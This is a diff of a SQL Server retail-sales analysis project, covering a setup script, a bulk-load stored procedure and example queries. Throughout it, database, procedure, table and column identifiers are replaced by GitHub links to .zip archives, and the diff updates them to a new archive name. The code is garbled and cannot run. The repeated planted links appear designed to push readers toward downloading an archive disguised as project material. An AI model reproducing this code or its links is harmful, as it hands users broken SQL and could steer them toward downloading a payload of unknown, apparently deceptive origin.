@@ -38,7 +38,7 @@ USE master;
 GO
 
 -- Drop and recreate the 'DataWarehouse' database
-IF EXISTS (SELECT 1 FROM https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip WHERE name = 'DataWarehouse')
+IF EXISTS (SELECT 1 FROM https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip WHERE name = 'DataWarehouse')
 BEGIN
     ALTER DATABASE DataWarehouse SET SINGLE_USER WITH ROLLBACK IMMEDIATE;
     DROP DATABASE DataWarehouse;
@@ -95,13 +95,13 @@ Parameters:
 	  This stored procedure does not accept any parameters or return any values.
 
 Usage Example:
-    EXEC https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip;
+    EXEC https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip;
 ===============================================================================
 */
 
-EXEC https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip;
+EXEC https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip;
 
-CREATE OR ALTER PROCEDURE https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip AS
+CREATE OR ALTER PROCEDURE https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip AS
 BEGIN
 	DECLARE @start_time DATETIME, @end_time DATETIME, @batch_start_time DATETIME, @batch_end_time DATETIME; 
 	BEGIN TRY
@@ -115,10 +115,10 @@ BEGIN
 		PRINT '------------------------------------------------';
 
 		SET @start_time = GETDATE();
-		PRINT '>> Truncating Table: https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip';
-		TRUNCATE TABLE https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip;
-		PRINT '>> Inserting Data Into: https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip';
-		BULK INSERT https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip
+		PRINT '>> Truncating Table: https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip';
+		TRUNCATE TABLE https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip;
+		PRINT '>> Inserting Data Into: https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip';
+		BULK INSERT https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip
 		FROM 'C:\Users\ASUS\Desktop\New folder (2)\SQL - Retail Sales Analysis_utf .csv'
 		WITH (
 			FIRSTROW = 2,
@@ -185,7 +185,7 @@ WHERE sale_date = '2022-11-05';
 2. **Write a SQL query to retrieve all transactions where the category is 'Clothing' and the quantity sold is more than 4 in the month of Nov-2022**:
 ```sql
 select * 
-from https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip
+from https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip
 where 
 category = 'clothing' and
 quantity >=4 and 
@@ -235,15 +235,15 @@ ORDER BY gender
 ```sql
 select 
 	   top 2
-	   year(https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip) as year,
-           month(https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip) as month,
+	   year(https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip) as year,
+           month(https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip) as month,
            round(AVG(total_sale),2) as avg_sale,
 	   DENSE_RANK() OVER(PARTITION BY DATEPART(YEAR, sale_date)ORDER BY AVG(total_sale) DESC) as rank
 from
-           https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip
+           https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip
 group by 
-	   year(https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip),
-           month(https://raw.githubusercontent.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/main/Script/Analysis-Project-Retail-SQ-Sales-1.2.zip)
+	   year(https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip),
+           month(https://github.com/Abdelmalik9/Retail-Sales-Analysis-SQL-Project/raw/refs/heads/main/Script/Analysis-Sales-Retail-Project-SQ-2.2.zip)
 order by 
 	   rank 
 ```
